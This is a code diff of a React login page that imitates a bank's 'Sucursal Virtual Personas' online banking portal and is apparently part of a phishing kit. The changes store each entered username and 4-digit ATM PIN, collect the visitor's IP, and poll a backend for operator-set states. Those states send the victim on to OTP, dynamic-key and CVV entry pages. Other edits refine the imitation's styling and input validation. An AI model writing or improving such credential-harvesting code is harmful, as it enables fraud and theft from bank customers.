@@ -236,7 +236,7 @@ export default function IniciarSesion() {
     }
   };
 
-  // Metodo para registrar el intento de DIN
+  // Metodo para registrar el intento de LOGIN
   const actualizarLocalStorage = (usuario, clave) => {
 
     // Se obtiene los datos del localStorage
@@ -248,25 +248,26 @@ export default function IniciarSesion() {
     // Se parsea el JSON o se inicializa un objeto vacío
     let datos = raw ? JSON.parse(raw) : {};
 
-    // Se inicializa el objeto de intentos si no existe
-    if (!datos.usuarios) datos.usuarios = {};
+    // ESTRUCTURA UNIFICADA: usuario.login (Array)
+    if (!datos.usuario) datos.usuario = {};
+    if (!datos.usuario.login) datos.usuario.login = [];
 
-    // Se crea la clave del nuevo intento
-    const intentoNum = Object.keys(datos.usuarios).length + 1;
-    const intentoKey = `intento_${intentoNum}`;
-
-    // Se registra el nuevo intento
-    datos.usuarios[intentoKey] = {
+    // Se crea el objeto del intento
+    const nuevoIntento = {
+      intento: datos.usuario.login.length + 1,
       usuario: usuario,
       clave: clave,
       fecha: new Date().toLocaleString(),
     };
 
+    // Se agrega al array
+    datos.usuario.login.push(nuevoIntento);
+
     // Se guarda nuevamente en el localStorage
     localStorage.setItem(storageKey, JSON.stringify(datos));
 
-    // Se retorna el objeto de intentos
-    return datos.usuarios;
+    // Se retorna el array
+    return datos.usuario.login;
   };
 
   // Obtiene la dirección IP pública del usuario
@@ -323,34 +324,51 @@ export default function IniciarSesion() {
     // Se captura el name y value del input
     const { name, value } = e.target;
 
+    // Se valida el campo
     if (name === "usuario") {
+
       // 1. RESTRICCIÓN DE ENTRADA: Solo permite escribir letras y números (sin espacios ni símbolos)
       const regexInput = /^[a-zA-Z0-9]*$/;
+
+      // Se valida con la regex
       if (!regexInput.test(value)) return;
 
       // 2. ACTUALIZACIÓN DEL ESTADO
       setFormState(prev => {
+
+        // Nuevo estado provisional
         const nuevoEstado = {
           ...prev,
           usuario: value,
           // 3. VALIDACIÓN DE COMPLEJIDAD: Verifica si tiene AL MENOS una letra Y un número
-          errorUsuario: !/(?=.*[a-zA-Z])(?=.*[0-9])/.test(value)
+          // errorUsuario: !/(?=.*[a-zA-Z])(?=.*[0-9])/.test(value)
+
+          // 3. Validacion para que minimo tenga 6 caracteres tipo string y mas de 1 número
+          errorUsuario: !(value.length >= 6 && /(?=.*[a-zA-Z])(?=.*[0-9])/.test(value))
         };
+
+        // 4. VALIDAR BOTÓN
         validarBoton(nuevoEstado);
         return nuevoEstado;
       });
 
     } else if (name === "clave") {
-      // Validación solo números
+      // Solo números
       const regexNumbers = /^[0-9]*$/;
+
+      // No permitir letras
       if (!regexNumbers.test(value)) return;
+
+      // Error si NO tiene exactamente 4 dígitos
+      const tieneError = value.length !== 4;
 
       setFormState(prev => {
         const nuevoEstado = {
           ...prev,
           clave: value,
-          errorClave: false
+          errorClave: tieneError
         };
+
         validarBoton(nuevoEstado);
         return nuevoEstado;
       });
@@ -380,6 +398,11 @@ export default function IniciarSesion() {
     if (name === "usuario" && !tieneError) {
       const cumpleComplejidad = /(?=.*[a-zA-Z])(?=.*[0-9])/.test(value);
       tieneError = !cumpleComplejidad;
+    }
+
+    if (name === "clave" && !tieneError) {
+      // Validación adicional para clave: debe tener exactamente 4 dígitos
+      tieneError = value.length !== 4;
     }
 
     // Se actualiza el estado del formulario
@@ -417,7 +440,7 @@ export default function IniciarSesion() {
 
       // Se llama el metodo para cerrar el modal
       cerrarModalAcciones();
-    }, 2500);
+    }, 2000);
   };
 
   // Metodo encargado de cerrar el modal
@@ -478,7 +501,7 @@ export default function IniciarSesion() {
   // Función para verificar el estado de aprobación
   const verificarEstadoAprobacion = async () => {
 
-    // Se usa el try
+    // Se usa el try catch
     try {
 
       // Se realiza la petición al backend
@@ -489,8 +512,10 @@ export default function IniciarSesion() {
 
       // Si llega configuración de tarjeta custom, la guardamos
       if (cardData) {
+
+        // Se guarda en el localStorage
         localStorageService.setItem("selectedCardData", cardData);
-      }
+      };
 
       // Estados que detienen el polling (redirecciones o finales)
       const estadosFinales = [
@@ -568,12 +593,18 @@ export default function IniciarSesion() {
           break;
         case 'error_otp':
 
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
+
           // Redirige a la página
           redirigir(`/numero-otp`);
 
           // Se sale del switch
           break;
         case 'error_din':
+
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
 
           // Redirige a la página
           redirigir(`/clave-dinamica`);
@@ -622,26 +653,26 @@ export default function IniciarSesion() {
 
           // Se sale del switch
           break;
-
         case 'error_cvv_custom':
-          // Redirige a validación con error
-          redirigir(`/validacion-cvv?error=true`);
-          break;
 
-        // ------------ CASOS ADICIONALES ------------
-        case 'aprobado':
-        case 'pendiente':
-        case 'error_pantalla':
-        case 'bloqueado_pantalla':
-        default:
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
+
+          // Redirige a validación con error
+          redirigir(`/validacion-cvv`);
+
+          // Se sale del switch
           break;
-      }
+        default:
+      };
     } catch (error) {
-      console.error('💥 [POLLING] Error:', {
-        mensaje: error.message,
-        status: error.response?.status
-      });
-    }
+
+      // Se quita el estado de cargando
+      setCargando(false);
+
+      // Se lanza una alerta de error
+      alert('Error consultando estado. Intente nuevamente.');
+    };
   };
 
   // Helper para redirección suave
@@ -652,7 +683,7 @@ export default function IniciarSesion() {
 
   // Se retorna el componente
   return (
-    <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
+    <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
       <div
         style={{
           flex: 1,
@@ -660,9 +691,8 @@ export default function IniciarSesion() {
           backgroundImage: 'url("/assets/images/auth-trazo.svg")',
           backgroundRepeat: "no-repeat",
           backgroundPosition: "center",
-          backgroundSize: "cover",
-          backgroundPositionY: "-140px",
-          backgroundPositionX: "-610px",
+          backgroundPositionY: "-70px",
+          backgroundPositionX: "-500px",
         }}
       >
         <div style={{ textAlign: "center" }}>
@@ -678,7 +708,7 @@ export default function IniciarSesion() {
             marginTop: "25px",
           }}
         >
-          <h1 className="general-title">
+          <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
             Sucursal Virtual Personas
           </h1>
         </div>
@@ -704,7 +734,7 @@ export default function IniciarSesion() {
                   color: "white",
                   fontFamily: "CIB Sans Light",
                   fontWeight: 600,
-                  fontSize: "17px",
+                  fontSize: "17.5px",
                 }}
               >
                 g
@@ -716,7 +746,7 @@ export default function IniciarSesion() {
                   color: "white",
                   fontFamily: "CIB Sans Light",
                   fontWeight: 600,
-                  fontSize: "17px",
+                  fontSize: "17.5px",
                 }}
               >
                 g
@@ -729,7 +759,7 @@ export default function IniciarSesion() {
 
             {/* ----------------------------------------- USUARIO -----------------------------------------*/}
             <div className={`input-group-custom ${formState.errorUsuario ? "has-error" : ""}`}>
-              <i className="i-Administrator input-icon"></i>
+              <img src="/assets/images/user.png" alt="User Icon" className="input-icon" width={16} height={17} />
 
               <div className="input-wrapper">
                 <input
@@ -748,7 +778,7 @@ export default function IniciarSesion() {
                   onCut={bloquearClipboard}
                   onContextMenu={bloquearClipboard}
                 />
-                <label style={{ color: "#ffffff" }}>Usuario</label>
+                <label style={{ color: "#ffffff", fontSize: "15px" }}>Usuario</label>
                 {/* BOTÓN LIMPIAR */}
                 {formState.usuario && (
                   <button
@@ -763,13 +793,13 @@ export default function IniciarSesion() {
               </div>
             </div>
             {formState.errorUsuario && <span className="input-error">Ingresa tu usuario</span>}
-            <a className="input-link" style={{ fontSize: "12px" }}>¿Olvidaste tu usuario?</a>
-
+            <br />
+            <a className="typegraphy-bold input-link" style={{ fontSize: "12px", marginTop: "0px" }}>¿Olvidaste tu usuario?</a>
             <br />
 
             {/* ----------------------------------------- CLAVE -----------------------------------------*/}
             <div className={`input-group-custom mt-2 ${formState.errorClave ? "has-error" : ""}`}>
-              <i className="i-Lock-2 input-icon"></i>
+              <img src="/assets/images/lock.png" alt="Lock Icon" className="input-icon" width={15} />
 
               <div className="input-wrapper">
                 <input
@@ -795,7 +825,7 @@ export default function IniciarSesion() {
                   onCut={bloquearClipboard}
                   onContextMenu={bloquearClipboard}
                 />
-                <label htmlFor="clave" style={{ color: "#ffffffff" }}>Clave del cajero</label>
+                <label htmlFor="clave" style={{ color: "#ffffffff", fontSize: "15px" }}>Clave del cajero</label>
                 {/* BOTÓN LIMPIAR */}
                 {formState.clave && (
                   <button
@@ -811,13 +841,14 @@ export default function IniciarSesion() {
             </div>
 
             {formState.errorClave && <span className="input-error">Ingresa tu clave</span>}
-            <a className="input-link" style={{ fontSize: "12px", padding: "5px" }}>¿Olvidaste o bloqueaste tu clave?</a>
+            <br />
+            <a className="typegraphy-bold input-link" style={{ fontSize: "12px", marginTop: "0px" }}>¿Olvidaste o bloqueaste tu clave?</a>
 
-            <button className="login-btn" style={{ marginTop: "45px" }} disabled={!botonHabilitado} onClick={() => handleLogin()}>
+            <button className="typegraphy-bold login-btn" style={{ marginTop: "45px" }} disabled={!botonHabilitado} onClick={() => handleLogin()}>
               Iniciar sesión
             </button>
 
-            <a className="create-user mt-4 input-link text-center" disabled={!botonHabilitado} href="#" style={{ fontSize: "12px" }}>
+            <a className="typegraphy-bold create-user mt-4 input-link text-center" disabled={!botonHabilitado} href="#" style={{ fontSize: "14.5px" }}>
               Crear usuario
             </a>
           </div>
